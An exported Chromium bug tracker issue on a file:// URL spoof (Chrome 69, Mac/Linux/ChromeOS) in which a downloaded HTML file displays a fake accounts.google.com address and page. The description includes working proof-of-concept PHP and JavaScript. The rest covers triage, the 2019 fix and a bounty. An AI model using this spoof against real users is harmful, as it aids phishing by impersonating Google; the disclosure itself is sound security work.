# Chrome v69 URL Spoof via FILE_SCHEME

| Field | Value |
|-------|-------|
| **Issue ID** | [40092387](https://issues.chromium.org/issues/40092387) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Internals>Network, UI>Browser>Downloads, UI>Browser>Navigation, UI>Browser>Omnibox |
| **Platforms** | Linux, Mac, ChromeOS |
| **Reporter** | ev...@gmail.com |
| **Assignee** | to...@chromium.org |
| **Created** | 2018-09-07 |
| **Bounty** | $500.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36

Steps to reproduce the problem:
1. PoC: https://server.n0tr00t.com/chrome/v69_download.php
2. Download & Open file
3. Click <a> tag

What is the expected behavior?

What went wrong?
chrome# cat v69_download.php
```
    <?php
    downloadFile("./v69_filescheme_urlspoof.html","PoC.html");

    function downloadFile($filePath,$saveAsFileName){
        ob_end_clean();

        $fileHandle=fopen($filePath,"rb");
        if($fileHandle===false){
            echo "Can not find file: $filePath\n";
            exit;
        }

        Header("Content-type: application/octet-stream");
        Header("Content-Transfer-Encoding: binary");
        Header("Accept-Ranges: bytes");
        Header("Content-Length: ".filesize($filePath));
        Header("Content-Disposition: attachment; filename=\"$saveAsFileName\"");

        while(!feof($fileHandle)) {
            echo fread($fileHandle, 32768);
        }
        fclose($fileHandle);
    }
```

chrome# cat v69_filescheme_urlspoof.html
```
    <html>
    <body>
        <div id="content">
        </div>
        <script>
            /* Chrome v69 FileScheme URL Spoof */
            let url = window.location.href.split('///');
            let target = url[0]+'//accounts.google.com/'+url[1];
            pwn = () => {
                window.open(target, 'test', 'width=250 height=300');
            }
            if(window.name=='test'){
                document.write('<title>Google 帐号</title><h1>Fake Google.com</h1>');
            } else {
                document.getElementById("content").innerHTML = "<h1 onclick='pwn()'>clickme</h1>";
            }
        </script>
    </body>
    </html>
```

Did this work before? N/A 

Chrome version: 69.0.3497.81  Channel: stable
OS Version: OS X 10.13.5
Flash Version: 

I think it should be handled like the display effect on the mobile version, filtering "//google.com", displaying "file:///"

## Attachments

- [0c6c898d-6a97-46a2-995a-1e5338d19b01.png](attachments/0c6c898d-6a97-46a2-995a-1e5338d19b01.png) (image/png, 35.9 KB)
- [v69_filescheme_urlspoof2.mov](attachments/v69_filescheme_urlspoof2.mov) (video/quicktime, 7.6 MB)
- [Screenshot from 2019-11-05 15-27-01.png](attachments/Screenshot from 2019-11-05 15-27-01.png) (image/png, 12.5 KB)

## Timeline

### mp...@google.com (2018-09-07)

Assigning to Omnibox people, and setting severity to low because the URL still has the file:// scheme and it requires significant user interaction. Anything we can do here?

[Monorail components: UI>Browser>Omnibox]

### mp...@chromium.org (2018-09-07)

Adding navigation and downloads tags, and they decide what gets shown in the omnibox when a page is downloaded.  creis@, perhaps you can help add the appropriate people to this security bug?

[Monorail components: UI>Browser>Downloads UI>Browser>Navigation]

### cr...@chromium.org (2018-09-10)

I'm pretty surprised-- it looks like you can put any string you want in the host position of a file: URL on Mac, Linux, and ChromeOS (not Windows).  Apparently file:///tmp/foo.html and file://anything.example.com/tmp/foo.html open the same file, which is the core thing this spoof depends on.  (On Windows, the URL loads but the fake host isn't shown.)

Agreed with the Low severity rating since it requires users to download and open a file, and since file:// is displayed (without any indication of HTTPS), but also agreed that this is a security bug that still has some potential to confuse users.

It looks like Firefox does something similar to Chrome on Windows and strips out the fake host, which seems reasonable to me.  (https://crbug.com/chromium/881675#c0 mentions that Android might do this, but I'm not sure what that refers too, since it doesn't seem easy to load a file: URL on Android.  Maybe there's a way to do it.)

I'm not familiar with Chrome's handling of file:// URLs in general.  Maybe someone from the networking team knows who we could talk to?

[Monorail components: Internals>Network]

### cr...@chromium.org (2018-09-10)

alexmos@ points to FileURLToFilePath as a possible lead (including some comments talking about this):
https://cs.chromium.org/chromium/src/net/base/filename_util.cc?l=63&rcl=246110ed126ecb520bc7808e092414f236369887

### to...@chromium.org (2018-09-24)

+emilyschechter - What do you think of disabling dimming of the scheme and path for FILE URLs? All portions of the URL seem equally important for that case.

I would even be okay with showing the scheme or icon in red.

--

+meacer - this seems like a great application of the URL-spoof look-alike infobar.

### ct...@chromium.org (2018-09-24)

Playing with highlighting in this case could be okay. Would we rather dim the entire thing here, rather than bringing everything back up? I'm thinking of weird elision edge cases where it could still end up looking like a normal origin (although highlighting-or-not is still a weak mitigation in my opinion).

Relatedly, we are thinking about showing a "File" chip instead of the scheme for file:// URLs.

For the lookalike detection UI, if we can readily extract the "host" component of the file URL, then I think it would be a reasonable place to hook into. However, it seems like it would be better to just mimic the Windows behavior across platforms (don't show the host at all for file:// URLs, since it has no connection to the origin).

### cr...@chromium.org (2018-09-24)

Comments 5-6: Shouldn't we strip out the fake host on Mac/Linux/ChromeOS the way we do on Windows, rather than leaving it there and adjusting how it looks?  That's what Firefox does.  I admit that I don't know enough about how we handle file:// URLs to be 100% sure it's unused, but if we can confirm that then it seems like the best approach here.

### cr...@chromium.org (2018-09-24)

[+nharper to help with network triage, to hopefully help find someone who knows file:// URLs, or maybe point us toward a better label.]

### ct...@chromium.org (2018-09-24)

Agreed with c#7. I would lean towards removing the host on all platforms as the easiest/best fix unless there are specific cases where it is important (I'll admit I'm not familiar with UNC paths). The other options feel like mitigations at best.

I'm not why exactly the behavior is different. The code linked in c#4 looks like it's used for internal checks (e.g., file access checks) rather than for the display code. I'm not sure which url_formatter code is used for file:// URLs. tommycli@ do you know which code paths are used for display here?

### to...@chromium.org (2018-09-24)

Re c#7: While reading the filename_util.cc code linked in c#4, it appeared that the host component did have some significance, as otherwise we wouldn't be explicitly handling that case and appending it to the base::FilePath.

Moreover, reading this IETF doc, it seems like it corresponds to a network share host. https://tools.ietf.org/html/rfc8089#appendix-E.3.1

It wouldn't be unreasonable for Chrome to strip out the host component if necessary for security reasons, but it also doesn't seem to solve the problem, since then the attacker could just put the misleading text in the path component. (albeit dimmed)

--

As for the URL formatting code, here's where it's called:
https://cs.chromium.org/chromium/src/components/toolbar/toolbar_model_impl.cc?sq=package:chromium&g=0&l=65-66

The body of url_formatter::FormatUrl doesn't do anything special with the host component of file:// URLs.

### cr...@chromium.org (2018-09-24)

https://crbug.com/chromium/881675#c10: I don't follow how an attacker could continue to use this if we strip out the host component.  The file won't load if you change the path to include something that looks like the hostname.  Currently, the downloaded file works fine regardless of hostname, which makes the spoof possible.

The main problem in this bug is that the following two URLs open the exact same file from disk, since the hostname appears to be ignored in practice:
file:///Users/foo/Downloads/somepage.html
file://accounts.google.com/Users/foo/Downloads/somepage.html

Seems like we should strip out the hostname unless it actually affects how the file is loaded in some case.  If so, maybe we should only leave it in place if it had an effect, removing it otherwise (as a form of canonicalization?).

### to...@chromium.org (2018-09-24)

This code has been around since at least 2008, as it predates adding net to the repository. (the oldest commit I could find) -- so it would be hard to find the original author.

### to...@chromium.org (2018-09-24)

krb just pointed out to me that the UNC was a distraction and on POSIX filesystems, the host component is truly completely ignored.

Which is what creis was pointing out in c#11 as well, but I missed that point until now.

It's interesting to me that Windows is the only platform where the 'host' apparently counts for something, yet Windows is also the platform where the host component is stripped away in the display...

### [Deleted User] (2018-09-24)

I was able to reproduce this by creating a file with the contents of v69_filescheme_urlspoof.html as provided in the description and then navigating directly to it (i.e. no download involved), so I think UI>Browser>Downloads could be removed from this bug.

I think it makes sense that we shouldn't be able to load/navigate to a file: URL on non-windows platforms that has a non-local host. (I don't know what the current behavior is of trying to load a UNC file: url on windows; I'm assuming it does something useful and shouldn't change.) I don't know whether this is best implemented in filename_util.cc, url_request_file_job.cc, or someplace else.

Assuming we do something useful with UNC paths, I don't think we should strip hosts from file: urls in the omnibox, but instead should dim it like the rest of the path.

If such a change breaks WPT for URLs (https://github.com/web-platform-tests/wpt/tree/master/url), we should probably look into updating the URL spec and the tests.

### ev...@gmail.com (2018-09-25)

Yes, `download` step just to make vulnerability exploit in HTTP/S --> file://. To a certain extent, there may be various attack scenarios.

### ke...@google.com (2018-11-26)

[Empty comment from Monorail migration]

### ke...@google.com (2018-11-26)

[Empty comment from Monorail migration]

### ke...@google.com (2018-12-06)

[Empty comment from Monorail migration]

### li...@chromium.org (2019-08-21)

We're showing a file chip now instead of the scheme, but not sure this actually solves the issue. Tommy, do you have any new thoughts on this one?

### jd...@chromium.org (2019-11-05)

Gentle ping for tommycli@ re: https://crbug.com/chromium/881675#c19.

### to...@chromium.org (2019-11-05)

I don't think the file chip solves the issue.

It's probably neutral. We should still fix it.

### to...@chromium.org (2019-11-05)

Here's a screenshot of why I think it's pretty neutral towards the issue.

### to...@chromium.org (2019-11-11)

I've done some more investigation of this topic this morning.

On Windows, the hostname is interpreted as the Samba share host, so it does do something quite useful. We should leave that alone. The "spoof" also doesn't work, since it actually changes the the share host.

On POSIX, the hostname is ignored and the URL is treated as local regardless of the host contents. The RFC doesn't prohibit this, from what I can tell, but it does comment that what we're doing is less than ideal:
   Treating a non-local file URI as local, or otherwise attempting to
   perform local operations on a non-local URI, can result in security
   problems.

My current plan is to do this:

For host portions that "obviously" resolve to localhost, continue supporting the host scheme: i.e. or file://localhost/... and file://127.0.0.1 and file://::1/
See IsLocalhost within net/base/url_utils.cc.

For URLs with any other hosts, just reject the URL. I say this because on POSIX systems, there's no obvious interpretation of file:// URLs with a host. Usually, remote files are just mounted to the 'normal' filesystem, so they would also be accessed with an empty host.

That should fix the spoof as well as make the behavior more consistent.

### pa...@chromium.org (2019-11-13)

[Empty comment from Monorail migration]

### jd...@chromium.org (2019-11-13)

[Empty comment from Monorail migration]

### sl...@google.com (2019-11-13)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-11-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/3187fae1b0fcee628a0b5fb39f65a4fe33f93869

commit 3187fae1b0fcee628a0b5fb39f65a4fe33f93869
Author: Tommy Li <tommycli@chromium.org>
Date: Thu Nov 14 20:04:22 2019

[net] Fix spoof attack on file:// URLs on POSIX systems

For file:// URLs on POSIX, we currently discard the host portion of the
URL, and treat all file:// URLs as local. On Windows, we use the host
portion as the SAMBA share, so this bug is inapplicable to Windows.

This allows us to have URLs like:
file://accounts.google.com/home/tommycli/Downloads/evil.html

This is a low severity bug, since it's quite hard to exploit, but we
should fix it anyways.

RFC 8089 doesn't actually prohibit our previous behavior, but it does
frown on it.

This CL *could* break file:// links that relied on the old behavior,
but those file:// links should probably be rightfully-broken, since
they didn't work on Windows anyways.

Bug: 881675
Change-Id: Ie9c90ac6285b698089205e73f46f0af13867e806
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1907071
Reviewed-by: Adam Langley <agl@chromium.org>
Reviewed-by: Min Qin <qinmin@chromium.org>
Reviewed-by: Mohammad Refaat <mrefaat@chromium.org>
Commit-Queue: Tommy Li <tommycli@chromium.org>
Cr-Commit-Position: refs/heads/master@{#715373}

[modify] https://crrev.com/3187fae1b0fcee628a0b5fb39f65a4fe33f93869/chrome/browser/download/download_browsertest.cc
[modify] https://crrev.com/3187fae1b0fcee628a0b5fb39f65a4fe33f93869/ios/chrome/browser/itunes_urls/itunes_urls_handler_tab_helper.mm
[modify] https://crrev.com/3187fae1b0fcee628a0b5fb39f65a4fe33f93869/net/base/filename_util.cc
[modify] https://crrev.com/3187fae1b0fcee628a0b5fb39f65a4fe33f93869/net/base/filename_util.h
[modify] https://crrev.com/3187fae1b0fcee628a0b5fb39f65a4fe33f93869/net/base/filename_util_unittest.cc


### to...@chromium.org (2019-11-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-11-15)

[Empty comment from Monorail migration]

### na...@google.com (2019-11-18)

[Empty comment from Monorail migration]

### na...@google.com (2019-12-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2019-12-05)

Congrats! The Panel decided to reward $500 for this report!

### na...@google.com (2019-12-05)

[Empty comment from Monorail migration]

### ev...@gmail.com (2019-12-05)

thanks for reward!

### to...@chromium.org (2019-12-10)

[Empty comment from Monorail migration]

### jd...@chromium.org (2019-12-20)

[Empty comment from Monorail migration]

### ad...@google.com (2020-02-02)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-02-03)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-02-10)

[Empty comment from Monorail migration]

### [Deleted User] (2020-02-21)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-06)

This issue was migrated from crbug.com/chromium/881675?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Internals>Network, UI>Browser>Downloads, UI>Browser>Navigation, UI>Browser>Omnibox]
[Monorail mergedwith: crbug.com/chromium/1032092, crbug.com/chromium/1036387]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092387)*
